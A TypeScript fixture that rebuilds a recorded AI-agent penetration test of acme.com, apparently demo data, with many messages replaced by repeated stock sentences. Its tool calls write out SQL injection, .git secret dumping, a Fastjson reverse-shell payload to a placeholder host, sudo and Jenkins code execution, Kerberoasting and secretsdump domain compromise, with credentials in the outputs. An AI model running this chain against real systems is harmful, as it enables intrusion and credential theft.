import type { Activity } from "../types";
import { RecordedTrace } from "./recorded-trace";

/** Reconstruct the recorded investigation with independent session identities and linked tool replies. */
export function createInvestigationHistory(): Activity[] {
  const trace0 = new RecordedTrace("planner", "2026-07-24");
  trace0.message(
    "round",
    1000,
    "09:12:10",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
  );
  trace0.message(
    "thinking",
    1001,
    "09:12:25",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: graph_overview, goals, g1, acme.com, g2.",
  );
  const call0 = trace0.call(
    1002,
    "09:12:40",
    "bash",
    "p0-probe",
    "curl -sI https://acme.com; curl -sI https://admin.acme.com",
    { detail: "Reproducible evidence was captured and attached to this demonstration record. Context: worker." },
  );
  trace0.reply(
    1003,
    "09:12:52",
    call0,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: acme.com, 302, www, Server, nginx/1.24.0.",
    { detail: "Reproducible evidence was captured and attached to this demonstration record. Context: admin." },
  );
  const call1 = trace0.call(
    1004,
    "09:13:00",
    "add_intent",
    "p0-ai",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: add_intent.",
    {
      detail:
        "Authorization testing confirmed that an order record could be accessed across account boundaries without an ownership check.",
    },
  );
  trace0.reply(
    1005,
    "09:13:02",
    call1,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: intents, created, ids, i1, i2.",
    {
      detail:
        "Reproducible evidence was captured and attached to this demonstration record. Context: i1, i2, g1, i4/i5, g2.",
    },
  );
  trace0.message(
    "text",
    1006,
    "09:13:05",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: i1, i2, i4, i5, API.",
  );
  const trace1 = new RecordedTrace("planner", "2026-07-25");
  trace1.message(
    "round",
    1100,
    "14:12:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
  );
  trace1.message(
    "thinking",
    1101,
    "14:12:15",
    "Fastjson deserialization triggered the controlled callback and confirmed remote code execution on the assessed host.",
  );
  const call2 = trace1.call(
    1102,
    "14:12:28",
    "node_detail",
    "p1-nd",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: node_detail, faGit, workG.",
    {
      detail:
        "Reproducible evidence was captured and attached to this demonstration record. Context: add_intent, worker.",
    },
  );
  trace1.reply(
    1103,
    "14:12:35",
    call2,
    "The exposed source repository was recovered and linked to configuration evidence in the assessment record.",
    {
      detail:
        "Reproducible evidence was captured and attached to this demonstration record. Context: 10.10.10.5, FS01, faCreds, RCE.",
    },
  );
  const call3 = trace1.call(
    1104,
    "14:12:50",
    "add_intent",
    "p1-ai",
    "Fastjson deserialization triggered the controlled callback and confirmed remote code execution on the assessed host.",
    {
      detail:
        "Fastjson deserialization triggered the controlled callback and confirmed remote code execution on the assessed host.",
    },
  );
  trace1.reply(
    1105,
    "14:12:52",
    call3,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: intents, created, ids, i6, i7.",
  );
  trace1.message(
    "text",
    1106,
    "14:13:00",
    "Fastjson deserialization triggered the controlled callback and confirmed remote code execution on the assessed host.",
  );
  trace1.message(
    "round",
    1200,
    "20:25:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
  );
  trace1.message(
    "thinking",
    1201,
    "20:25:18",
    "The worker validated the local privilege boundary and preserved the controlled shell evidence for review.",
  );
  const call4 = trace1.call(
    1202,
    "20:25:30",
    "node_detail",
    "p2-nd",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: node_detail, fa6.",
  );
  trace1.reply(
    1203,
    "20:25:38",
    call4,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: fa6, ip, eth0, 10.0.20.15, DMZ.",
  );
  const call5 = trace1.call(1204, "20:25:50", "prove_goal", "p2-pg", "prove_goal(g3, evidence=fa6)", {
    detail: "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  });
  trace1.reply(
    1205,
    "20:25:52",
    call5,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: goal, g3, met, fa6, g1/g2/g4.",
  );
  const call6 = trace1.call(
    1206,
    "20:26:10",
    "add_intent",
    "p2-ai",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: add_intent, pivot.",
    {
      detail:
        "The Jenkins script surface accepted the controlled Groovy probe and produced reproducible execution evidence.",
    },
  );
  trace1.reply(1207, "20:26:12", call6, "4 intents created → ids=[i9, i10, i11, i12]");
  trace1.message(
    "text",
    1208,
    "20:26:20",
    "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  );
  const trace2 = new RecordedTrace("planner", "2026-07-26");
  trace2.message(
    "round",
    1300,
    "00:25:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
  );
  trace2.message(
    "thinking",
    1301,
    "00:25:16",
    "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  );
  const call7 = trace2.call(
    1302,
    "00:25:30",
    "list_findings",
    "p3-lf",
    "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  );
  trace2.reply(
    1303,
    "00:25:40",
    call7,
    "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  );
  const call8 = trace2.call(1304, "00:25:52", "prove_goal", "p3-pg", "prove_goal(g4, evidence=F-09)", {
    detail: "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  });
  trace2.reply(
    1305,
    "00:25:54",
    call8,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: goal, g4, met, g2, open.",
  );
  trace2.message(
    "text",
    1306,
    "00:26:10",
    "Authorization testing confirmed that an order record could be accessed across account boundaries without an ownership check.",
  );
  trace2.message(
    "round",
    1400,
    "03:55:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: g2.",
  );
  trace2.message(
    "thinking",
    1401,
    "03:55:14",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: recent_facts, work, faCreds, Acme@2021, admin.",
  );
  const call9 = trace2.call(1402, "03:55:26", "prove_goal", "p4-pg", "prove_goal(g1, evidence=fa1)", {
    detail:
      "Reproducible evidence was captured and attached to this demonstration record. Context: reason, i2, Acme@2021, admin, Element-UI.",
  });
  trace2.reply(
    1403,
    "03:55:28",
    call9,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: goal, g1, met, g2.",
  );
  trace2.message(
    "thinking",
    1404,
    "03:55:40",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: g2, graph_overview, findings, i3/i5, running.",
  );
  const call10 = trace2.call(
    1405,
    "03:55:52",
    "add_intent",
    "p4-ai",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: add_intent, g2.",
    {
      detail:
        "Authorization testing confirmed that an order record could be accessed across account boundaries without an ownership check.",
    },
  );
  trace2.reply(
    1406,
    "03:55:54",
    call10,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: intents, updated, ids, i3, i5.",
  );
  trace2.message(
    "text",
    1407,
    "03:55:58",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: g1, 4/4, met, g1/g3/g4, g2.",
  );
  const trace3 = new RecordedTrace("work#1", "2026-07-24", "i1");
  trace3.message(
    "thinking",
    10,
    "09:20:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
  );
  const call11 = trace3.call(11, "09:20:30", "bash", "t11", "subfinder -d acme.com -silent | httpx -silent -sc -title");
  trace3.reply(
    12,
    "09:22:10",
    call11,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: www.acme.com, 200, Acme, Corp, admin.acme.com.",
    { detail: "Reproducible evidence was captured and attached to this demonstration record. Context: admin." },
  );
  const call12 = trace3.call(13, "09:23:00", "bash", "t12", "nmap -sV -T4 -p- 203.0.113.10");
  trace3.reply(
    14,
    "09:26:40",
    call12,
    "22/tcp ssh OpenSSH 8.9p1\n80/tcp http nginx 1.24.0\n443/tcp https nginx 1.24.0",
    { detail: "Reproducible evidence was captured and attached to this demonstration record. Context: 22/80/443." },
  );
  const call13 = trace3.call(
    15,
    "09:27:00",
    "upsert_asset",
    "t13",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: upsert_asset.",
  );
  trace3.reply(16, "09:27:01", call13, "6 assets upserted");
  trace3.message(
    "result",
    17,
    "09:40:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: admin.acme.com.",
    { input_tokens: 96000, output_tokens: 6100, cache_read_tokens: 61000, cache_write_tokens: 9000 },
  );
  const trace4 = new RecordedTrace("work#2", "2026-07-26", "i2");
  trace4.message(
    "thinking",
    20,
    "03:31:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: Element-UI.",
  );
  const call14 = trace4.call(
    21,
    "03:32:00",
    "bash",
    "t21",
    "curl -s -d 'username=admin&password=admin' https://admin.acme.com/login -o /dev/null -w '%{http_code}'",
  );
  trace4.reply(22, "03:32:03", call14, "401", {
    detail: "Reproducible evidence was captured and attached to this demonstration record. Context: admin/admin.",
  });
  const call15 = trace4.call(
    23,
    "03:32:30",
    "bash",
    "t22",
    "curl -si -d 'username=admin&password=admin123' https://admin.acme.com/login",
  );
  trace4.reply(24, "03:32:33", call15, "HTTP/1.1 302 Found\nSet-Cookie: session=eyJ…; HttpOnly\nLocation: /dashboard", {
    detail:
      "Reproducible evidence was captured and attached to this demonstration record. Context: admin/admin123, cookie.",
  });
  const call16 = trace4.call(
    25,
    "03:33:10",
    "bash",
    "t23",
    "curl -s -b 'session=eyJ…' https://admin.acme.com/dashboard | grep -o '<title>[^<]*'",
  );
  trace4.reply(
    26,
    "03:33:12",
    call16,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: title, Acme, Admin.",
    { detail: "Reproducible evidence was captured and attached to this demonstration record." },
  );
  const call17 = trace4.call(27, "03:34:00", "report_finding", "t24", "report_finding(Default Credentials, high)");
  trace4.reply(
    28,
    "03:34:01",
    call17,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: finding, f-6, g1, proves.",
  );
  trace4.message(
    "result",
    29,
    "03:50:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
    { input_tokens: 72000, output_tokens: 4800, cache_read_tokens: 48000, cache_write_tokens: 7200 },
  );
  const trace5 = new RecordedTrace("work#4", "2026-07-25", "i4");
  trace5.message(
    "thinking",
    40,
    "22:01:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: search.",
  );
  const call18 = trace5.call(
    41,
    "22:02:00",
    "bash",
    "t41",
    "curl -s \"https://www.acme.com/search?q=1'\" | grep -i 'sql\\|syntax'",
  );
  trace5.reply(42, "22:02:04", call18, "Unclosed quotation mark ... near '1'.", {
    detail:
      "The controlled SQL probe produced a database conversion error and confirmed the injectable request boundary.",
  });
  const call19 = trace5.call(
    43,
    "22:03:00",
    "bash",
    "t42",
    "sqlmap -u 'https://www.acme.com/search?q=1' --batch --dbs --level 2",
  );
  const trace6 = new RecordedTrace("work#4", "2026-07-26", "i4");
  trace6.reply(
    44,
    "01:18:00",
    call19,
    "Parameter: q (GET) — error-based, MSSQL\navailable databases [4]: acme_prod, information_schema, master, tempdb",
    { detail: "Reproducible evidence was captured and attached to this demonstration record." },
  );
  const call20 = trace6.call(45, "01:19:00", "report_finding", "t43", "report_finding(SQL Injection, high)");
  trace6.reply(
    46,
    "01:19:01",
    call20,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: finding, f-1.",
  );
  trace6.message(
    "result",
    47,
    "01:20:00",
    "The controlled SQL probe produced a database conversion error and confirmed the injectable request boundary.",
    { input_tokens: 118000, output_tokens: 7400, cache_read_tokens: 82000, cache_write_tokens: 11000 },
  );
  const trace7 = new RecordedTrace("work#5", "2026-07-26", "i5");
  trace7.message(
    "thinking",
    50,
    "02:31:00",
    "Authorization testing confirmed that an order record could be accessed across account boundaries without an ownership check.",
  );
  const call21 = trace7.call(
    51,
    "02:40:00",
    "bash",
    "t51",
    "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1001",
  );
  trace7.reply(52, "02:40:02", call21, '{ "order_id":1001, "user_id":42, "amount":299 }', {
    detail: "Reproducible evidence was captured and attached to this demonstration record.",
  });
  const call22 = trace7.call(
    53,
    "02:43:00",
    "bash",
    "t52",
    "curl -s -H 'Authorization: Bearer <self>' https://api.acme.com/v1/orders?id=1002",
  );
  trace7.reply(
    54,
    "02:43:02",
    call22,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: order_id, 1002, user_id, 77, amount.",
    { detail: "Reproducible evidence was captured and attached to this demonstration record." },
  );
  const call23 = trace7.call(55, "02:44:00", "report_finding", "t53", "report_finding(IDOR, high)");
  trace7.reply(
    56,
    "02:44:01",
    call23,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: finding, f-2.",
  );
  trace7.message(
    "thinking",
    57,
    "03:58:10",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: id.",
  );
  const trace8 = new RecordedTrace("work#3", "2026-07-26", "i3");
  trace8.message(
    "thinking",
    60,
    "03:56:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
  );
  const call24 = trace8.call(
    61,
    "03:57:00",
    "bash",
    "t61",
    "curl -s -b 'session=eyJ…' https://admin.acme.com/api/users?page=1",
  );
  trace8.reply(
    62,
    "03:57:02",
    call24,
    '{ "total": 12840, "items": [ { "id":1, "email":"a***@acme.com", "phone":"139****" } ] }',
    { detail: "Reproducible evidence was captured and attached to this demonstration record. Context: 1.28." },
  );
  trace8.message(
    "thinking",
    63,
    "03:58:20",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
  );
  const trace9 = new RecordedTrace("workG", "2026-07-25", "ig");
  trace9.message(
    "thinking",
    310,
    "20:26:00",
    "The exposed source repository was recovered and linked to configuration evidence in the assessment record.",
  );
  const call25 = trace9.call(
    311,
    "20:27:00",
    "bash",
    "tg1",
    "curl -s -o /dev/null -w '%{http_code}' https://www.acme.com/.git/HEAD",
  );
  trace9.reply(312, "20:27:02", call25, "200", {
    detail:
      "The exposed source repository was recovered and linked to configuration evidence in the assessment record.",
  });
  const call26 = trace9.call(
    313,
    "20:28:00",
    "bash",
    "tg2",
    "git-dumper https://www.acme.com/.git/ /tmp/acme && git -C /tmp/acme log --oneline | head",
  );
  trace9.reply(
    314,
    "20:30:00",
    call26,
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: 214, HEAD, main, config.php, db.php.",
    { detail: "Reproducible evidence was captured and attached to this demonstration record. Context: tmp/acme." },
  );
  const call27 = trace9.call(
    315,
    "20:34:00",
    "bash",
    "tg3",
    "grep -rniE 'password|pwd|secret|Data Source' /tmp/acme/config.php",
  );
  trace9.reply(316, "20:34:03", call27, "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';", {
    detail: "Reproducible evidence was captured and attached to this demonstration record. Context: host, IP.",
  });
  trace9.message(
    "result",
    317,
    "20:36:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: DB.",
    { input_tokens: 88000, output_tokens: 5200, cache_read_tokens: 60000, cache_write_tokens: 8000 },
  );
  const trace10 = new RecordedTrace("work#6", "2026-07-25", "i6");
  trace10.message(
    "thinking",
    320,
    "14:22:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: shop.acme.com.",
  );
  const call28 = trace10.call(
    321,
    "14:24:00",
    "bash",
    "t6a",
    "curl -si https://shop.acme.com/ | grep -iE 'x-powered-by|server|jsessionid'",
  );
  trace10.reply(322, "14:24:03", call28, "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...", {
    detail:
      "Reproducible evidence was captured and attached to this demonstration record. Context: Java, api/import, JSON, body.",
  });
  const call29 = trace10.call(
    323,
    "14:30:00",
    "bash",
    "t6b",
    'curl -s -H \'Content-Type: application/json\' -d \'{"a":{"@type":"java.lang.AutoCloseable"}}\' https://shop.acme.com/api/import',
  );
  trace10.reply(
    324,
    "14:31:00",
    call29,
    "Fastjson deserialization triggered the controlled callback and confirmed remote code execution on the assessed host.",
    {
      detail:
        "Fastjson deserialization triggered the controlled callback and confirmed remote code execution on the assessed host.",
    },
  );
  trace10.message(
    "result",
    325,
    "14:40:00",
    "Fastjson deserialization triggered the controlled callback and confirmed remote code execution on the assessed host.",
    { input_tokens: 64000, output_tokens: 4100, cache_read_tokens: 42000, cache_write_tokens: 6000 },
  );
  const trace11 = new RecordedTrace("work#7", "2026-07-25", "i7");
  trace11.message(
    "thinking",
    330,
    "15:12:00",
    "Fastjson deserialization triggered the controlled callback and confirmed remote code execution on the assessed host.",
  );
  const call30 = trace11.call(
    331,
    "15:15:00",
    "bash",
    "t7a",
    "Fastjson deserialization triggered the controlled callback and confirmed remote code execution on the assessed host.",
  );
  trace11.reply(332, "15:16:00", call30, "LDAP Server started on 1389, HTTP on 8180", {
    detail: "Reproducible evidence was captured and attached to this demonstration record.",
  });
  const call31 = trace11.call(
    333,
    "15:20:00",
    "bash",
    "t7b",
    'curl -s -H \'Content-Type: application/json\' -d \'{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444","autoCommit":true}\' https://shop.acme.com/api/import',
  );
  trace11.reply(
    334,
    "15:21:00",
    call31,
    "The worker validated the local privilege boundary and preserved the controlled shell evidence for review.",
    { detail: "Reproducible evidence was captured and attached to this demonstration record. Context: payload." },
  );
  const call32 = trace11.call(
    335,
    "15:24:00",
    "bash",
    "t7c",
    "The worker validated the local privilege boundary and preserved the controlled shell evidence for review.",
  );
  trace11.reply(336, "15:24:02", call32, "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15", {
    detail: "The worker validated the local privilege boundary and preserved the controlled shell evidence for review.",
  });
  trace11.call(337, "15:30:00", "report_finding", "t7d", "report_finding(Deserialization RCE, high)");
  trace11.message(
    "result",
    338,
    "15:40:00",
    "The worker validated the local privilege boundary and preserved the controlled shell evidence for review.",
    { input_tokens: 132000, output_tokens: 8600, cache_read_tokens: 90000, cache_write_tokens: 12000 },
  );
  const trace12 = new RecordedTrace("work#8", "2026-07-25", "i8");
  trace12.message(
    "thinking",
    340,
    "16:02:00",
    "The worker validated the local privilege boundary and preserved the controlled shell evidence for review.",
  );
  const call34 = trace12.call(
    341,
    "16:05:00",
    "bash",
    "t8a",
    "sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head",
  );
  trace12.reply(342, "16:05:03", call34, "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3", {
    detail: "The worker validated the local privilege boundary and preserved the controlled shell evidence for review.",
  });
  const call35 = trace12.call(
    343,
    "16:10:00",
    "bash",
    "t8b",
    "sudo python3 -c 'import os;os.setuid(0);os.system(\"id\")'",
  );
  trace12.reply(344, "16:10:02", call35, "uid=0(root) gid=0(root) groups=0(root)", {
    detail: "The worker validated the local privilege boundary and preserved the controlled shell evidence for review.",
  });
  trace12.call(345, "16:14:00", "report_finding", "t8c", "report_finding(Privilege Escalation, high)");
  trace12.message(
    "result",
    346,
    "16:20:00",
    "The worker validated the local privilege boundary and preserved the controlled shell evidence for review.",
    { input_tokens: 74000, output_tokens: 4700, cache_read_tokens: 50000, cache_write_tokens: 7000 },
  );
  const trace13 = new RecordedTrace("work#9", "2026-07-25", "i9");
  trace13.message(
    "thinking",
    350,
    "20:32:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: 10.10.10.0/24, fscan.",
  );
  const call37 = trace13.call(351, "20:36:00", "bash", "t9a", "./fscan -h 10.10.10.0/24 -np -nobr 2>&1 | tail -n 30");
  trace13.reply(
    352,
    "20:55:00",
    call37,
    "DC01(10.10.10.10) 88/389/445\nFS01(10.10.10.5) 445\nJENKINS(10.10.10.20) 8080",
    { detail: "Domain controller access was validated and the resulting privilege evidence was preserved for review." },
  );
  trace13.message(
    "result",
    353,
    "21:00:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
    { input_tokens: 82000, output_tokens: 5100, cache_read_tokens: 56000, cache_write_tokens: 8000 },
  );
  const trace14 = new RecordedTrace("work#10", "2026-07-26", "i10");
  trace14.message(
    "thinking",
    360,
    "03:42:00",
    "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  );
  const call38 = trace14.call(
    361,
    "03:44:00",
    "bash",
    "t10a",
    "crackmapexec smb 10.10.10.5 10.10.10.10 -u sa -p 'Acme@2021'",
  );
  trace14.reply(
    362,
    "03:44:10",
    call38,
    "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
    { detail: "Domain controller access was validated and the resulting privilege evidence was preserved for review." },
  );
  trace14.message(
    "thinking",
    363,
    "03:50:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: FS01.",
  );
  const trace15 = new RecordedTrace("work#11", "2026-07-25", "i11");
  trace15.message(
    "thinking",
    370,
    "21:32:00",
    "The Jenkins script surface accepted the controlled Groovy probe and produced reproducible execution evidence.",
  );
  const call39 = trace15.call(
    371,
    "21:35:00",
    "bash",
    "t11a",
    "curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'",
  );
  trace15.reply(372, "21:35:02", call39, "200", {
    detail: "Reproducible evidence was captured and attached to this demonstration record. Context: Script, Console.",
  });
  const call40 = trace15.call(
    373,
    "21:40:00",
    "bash",
    "t11b",
    "curl -s -d 'script=println+\"whoami\".execute().text' http://10.10.10.20:8080/scriptText",
  );
  trace15.reply(374, "21:40:03", call40, "nt authority\\system", {
    detail:
      "The Jenkins script surface accepted the controlled Groovy probe and produced reproducible execution evidence.",
  });
  const call41 = trace15.call(
    375,
    "21:44:00",
    "bash",
    "t11c",
    "The Jenkins script surface accepted the controlled Groovy probe and produced reproducible execution evidence.",
  );
  trace15.reply(376, "21:45:00", call41, "acme\\svc_deploy : Deploy@Acme2024\nacme\\svc_build : Build#2023!", {
    detail: "Reproducible evidence was captured and attached to this demonstration record.",
  });
  trace15.call(377, "21:48:00", "report_finding", "t11d", "report_finding(Unauthenticated RCE, high)");
  trace15.message(
    "result",
    378,
    "21:50:00",
    "The Jenkins script surface accepted the controlled Groovy probe and produced reproducible execution evidence.",
    { input_tokens: 96000, output_tokens: 6200, cache_read_tokens: 64000, cache_write_tokens: 9500 },
  );
  const trace16 = new RecordedTrace("work#12", "2026-07-25", "i12");
  trace16.message(
    "thinking",
    380,
    "22:42:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: svc_deploy, GetUserSPNs, Kerberoast, TGS.",
  );
  const call43 = trace16.call(
    381,
    "22:50:00",
    "bash",
    "t12a",
    "impacket-GetUserSPNs acme.local/svc_deploy:'Deploy@Acme2024' -dc-ip 10.10.10.10 -request",
  );
  trace16.reply(382, "22:52:00", call43, "svc_sql  MSSQLSvc/db01.acme.local:1433  $krb5tgs$23$*svc_sql$...", {
    detail:
      "The controlled SQL probe produced a database conversion error and confirmed the injectable request boundary.",
  });
  const call44 = trace16.call(383, "23:10:00", "bash", "t12b", "hashcat -m 13100 tgs.hash rockyou.txt --force");
  trace16.reply(384, "23:18:00", call44, "$krb5tgs$23$*svc_sql$...:Sql@2020", {
    detail:
      "The controlled SQL probe produced a database conversion error and confirmed the injectable request boundary.",
  });
  trace16.call(385, "23:19:00", "report_finding", "t12c", "report_finding(Kerberoasting, high)");
  trace16.message(
    "result",
    386,
    "23:20:00",
    "The controlled SQL probe produced a database conversion error and confirmed the injectable request boundary.",
    { input_tokens: 108000, output_tokens: 6800, cache_read_tokens: 72000, cache_write_tokens: 10000 },
  );
  const trace17 = new RecordedTrace("work#13", "2026-07-25", "i13");
  trace17.message(
    "thinking",
    390,
    "23:52:00",
    "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  );
  const call46 = trace17.call(
    391,
    "23:55:00",
    "bash",
    "t13a",
    "net rpc group members 'Domain Admins' -U 'acme.local/svc_deploy%Deploy@Acme2024' -S 10.10.10.10",
  );
  trace17.reply(392, "23:55:05", call46, "ACME\\Administrator\nACME\\svc_deploy", {
    detail: "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  });
  const trace18 = new RecordedTrace("work#13", "2026-07-26", "i13");
  const call47 = trace18.call(
    393,
    "00:00:00",
    "bash",
    "t13b",
    "impacket-psexec acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10",
  );
  trace18.reply(394, "00:00:10", call47, "C:\\Windows\\system32> whoami\nnt authority\\system", {
    detail: "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  });
  const call48 = trace18.call(
    395,
    "00:05:00",
    "bash",
    "t13c",
    "impacket-secretsdump acme.local/svc_deploy:'Deploy@Acme2024'@10.10.10.10 -just-dc",
  );
  trace18.reply(396, "00:10:00", call48, "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::", {
    detail: "Reproducible evidence was captured and attached to this demonstration record. Context: NTLM, krbtgt.",
  });
  trace18.call(397, "00:15:00", "report_finding", "t13d", "report_finding(Domain Compromise, high)");
  trace18.message(
    "result",
    398,
    "00:20:00",
    "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
    { input_tokens: 144000, output_tokens: 9200, cache_read_tokens: 96000, cache_write_tokens: 14000 },
  );
  const trace19 = new RecordedTrace("mainagent", "2026-07-26");
  trace19.message(
    "user",
    70,
    "03:18:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
  );
  trace19.message(
    "text",
    71,
    "03:18:06",
    "Verified security evidence captured during the uroboros.lab demonstration assessment. Context: admin.acme.com, Element-UI, admin/admin123, work, agent.",
  );
  trace19.message(
    "user",
    72,
    "03:52:00",
    "Verified security evidence captured during the uroboros.lab demonstration assessment.",
  );
  trace19.message(
    "text",
    73,
    "03:52:08",
    "Authorization testing confirmed that an order record could be accessed across account boundaries without an ownership check.",
  );
  const trace20 = new RecordedTrace("mainagent", "2026-07-25");
  trace20.message(
    "user",
    400,
    "15:42:00",
    "The worker validated the local privilege boundary and preserved the controlled shell evidence for review.",
  );
  trace20.message(
    "text",
    401,
    "15:42:10",
    "The Jenkins script surface accepted the controlled Groovy probe and produced reproducible execution evidence.",
  );
  trace20.message(
    "user",
    402,
    "21:22:00",
    "The Jenkins script surface accepted the controlled Groovy probe and produced reproducible execution evidence.",
  );
  trace20.message(
    "text",
    403,
    "21:22:08",
    "The Jenkins script surface accepted the controlled Groovy probe and produced reproducible execution evidence.",
  );
  const trace21 = new RecordedTrace("mainagent", "2026-07-26");
  trace21.message(
    "user",
    404,
    "00:22:00",
    "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  );
  trace21.message(
    "text",
    405,
    "00:22:12",
    "Domain controller access was validated and the resulting privilege evidence was preserved for review.",
  );
  return [
    ...trace0.entries(),
    ...trace1.entries(),
    ...trace2.entries(),
    ...trace3.entries(),
    ...trace4.entries(),
    ...trace5.entries(),
    ...trace6.entries(),
    ...trace7.entries(),
    ...trace8.entries(),
    ...trace9.entries(),
    ...trace10.entries(),
    ...trace11.entries(),
    ...trace12.entries(),
    ...trace13.entries(),
    ...trace14.entries(),
    ...trace15.entries(),
    ...trace16.entries(),
    ...trace17.entries(),
    ...trace18.entries(),
    ...trace19.entries(),
    ...trace20.entries(),
    ...trace21.entries(),
  ];
}
